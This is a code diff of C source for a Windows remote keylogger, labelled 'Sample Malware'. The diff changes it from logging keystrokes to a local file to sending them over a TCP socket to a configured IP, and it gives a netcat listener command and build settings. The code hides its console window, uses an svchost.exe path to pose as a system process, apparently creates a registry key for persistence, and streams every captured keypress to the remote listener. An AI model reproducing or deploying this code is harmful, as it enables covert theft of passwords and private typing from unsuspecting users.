@@ -1,16 +1,29 @@
-/*					OFFLINE KEYLOGGER
- *		Logs key strokes in "%TMP%\svchost.log"
+/*-------------------------------------------------------------------------------------------------
  *
- * Check the following options (Visual Studio):
- *      + Config Properties --> C/C++ --> Advanced:
- *        Calling conventions: __stdcall
- *      + Config Properties --> Linker --> System:
- *        SubSystem: Console (/SUBSYSTEM:CONSOLE)
- *      + Config Properties --> Linker --> General
- *        Enable Incremental Linking: No (/INCREMENTAL:NO)
+ *      Sample Malware: Remote Keylogger
+ *      Function      : Sends keystrokes to DEFAULT_IP (preprocessor directive)
+ *      Requirements  : A netcat server should be available at the DEFAULT_IP to accept the connection
+ *                      Use "nc -nvvl -p27015" to start the netcat server
+ * 
+ *-----------------------------------------------------------------------------------------------
  *
- * Server setup: nc -nvvl -p27015
-**/
+ *        Best built in Visual Studio 10
+ *          Porject settings (Configuration Properties):
+ * 
+ *              1. C/C++ --> Advanced --> Calling convention
+ *                 Set __stdcall (Gz)
+ * 
+ *              2. C/C++ --> Code Generation --> Buffer Security Check
+ *                 Set NO
+ * 
+ *              3. Linker --> General --> Enable Incremental Linking
+ *                 Set NO
+ * 
+ *              4. Linker --> System --> SubSystem
+ *                 Set CONSOLE
+ *
+ *-----------------------------------------------------------------------------------------------*/
+
 #define __DEBUG__
 //#define __RECEV__
 
@@ -45,19 +58,19 @@ int create_key(char *);
 int get_keys(void);
 
 int main(void){
-	/* creating stealth (window is not visible) */
-	HWND stealth;
+    /* creating stealth (window is not visible) */
+    HWND stealth;
     AllocConsole();
     stealth=FindWindowA("ConsoleWindowClass",NULL);
     ShowWindow(stealth,0);
 
     int test,create;
-	/* check if key is available for opening */
-	test=test_key();
+    /* check if key is available for opening */
+    test=test_key();
 
-	/* create key */
+    /* create key */
     if (test==2){
-		/* the path in which the file needs to be */
+        /* the path in which the file needs to be */
        char *path="c:\\%windir%\\svchost.exe";
        create=create_key(path);
     }
@@ -68,63 +81,63 @@ int main(void){
 
 int get_keys(void){
     
-	WSADATA wsaData;
-	int iResult;
+    WSADATA wsaData;
+    int iResult;
 
-	/* Initialize Winsock */
-	iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
-	if (iResult != 0) {	return 0; }
+    /* Initialize Winsock */
+    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
+    if (iResult != 0) {    return 0; }
 
-	/* Creating socket for client */
-	struct addrinfo *result = NULL, *ptr = NULL, hints;
-	ZeroMemory( &hints, sizeof(hints) );
-	hints.ai_family = AF_UNSPEC;
-	hints.ai_socktype = SOCK_STREAM;
-	hints.ai_protocol = IPPROTO_TCP;
+    /* Creating socket for client */
+    struct addrinfo *result = NULL, *ptr = NULL, hints;
+    ZeroMemory( &hints, sizeof(hints) );
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
 
-	/* Resolve the server address and port */
-	iResult = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result);
-	if (iResult != 0) { WSACleanup(); return 0; }
+    /* Resolve the server address and port */
+    iResult = getaddrinfo(DEFAULT_IP, DEFAULT_PORT, &hints, &result);
+    if (iResult != 0) { WSACleanup(); return 0; }
 
-	SOCKET ConnectSocket = INVALID_SOCKET;
+    SOCKET ConnectSocket = INVALID_SOCKET;
 
-	/* Attempt to connect to the first address returned by
-	 * the call to getaddrinfo
-	 */
-	ptr=result;
+    /* Attempt to connect to the first address returned by
+     * the call to getaddrinfo
+     */
+    ptr=result;
 
-	/* Create a SOCKET for connecting to server */
-	ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
-	if (ConnectSocket == INVALID_SOCKET) {
-		freeaddrinfo(result);
-		WSACleanup();
-		return 0;
-	}
+    /* Create a SOCKET for connecting to server */
+    ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+    if (ConnectSocket == INVALID_SOCKET) {
+        freeaddrinfo(result);
+        WSACleanup();
+        return 0;
+    }
 
 
-	/* Connect to server */
-	iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
-	if (iResult == SOCKET_ERROR) {
-		closesocket(ConnectSocket);
-		ConnectSocket = INVALID_SOCKET;
-	}
-	freeaddrinfo(result);
-	if (ConnectSocket == INVALID_SOCKET) { WSACleanup(); return -1; }
-	int recvbuflen = DEFAULT_BUFLEN;
-	char sendbuf[] = {0, 0};
+    /* Connect to server */
+    iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+    if (iResult == SOCKET_ERROR) {
+        closesocket(ConnectSocket);
+        ConnectSocket = INVALID_SOCKET;
+    }
+    freeaddrinfo(result);
+    if (ConnectSocket == INVALID_SOCKET) { WSACleanup(); return -1; }
+    int recvbuflen = DEFAULT_BUFLEN;
+    char sendbuf[] = {0, 0};
 
     while(1){
         Sleep(100);
         for(char character=0x30;character<=0x5A;character++){
             if(GetAsyncKeyState(character)&0x1==0x1){
-				/* Send charector */
-				sendbuf[0] = character;
-				if (send(ConnectSocket, sendbuf, 1, 0) == SOCKET_ERROR) {
-					closesocket(ConnectSocket);
-					WSACleanup();
-					return -1;
-				}
-				break;
+                /* Send charector */
+                sendbuf[0] = character;
+                if (send(ConnectSocket, sendbuf, 1, 0) == SOCKET_ERROR) {
+                    closesocket(ConnectSocket);
+                    WSACleanup();
+                    return -1;
+                }
+                break;
             }    
         }
     }
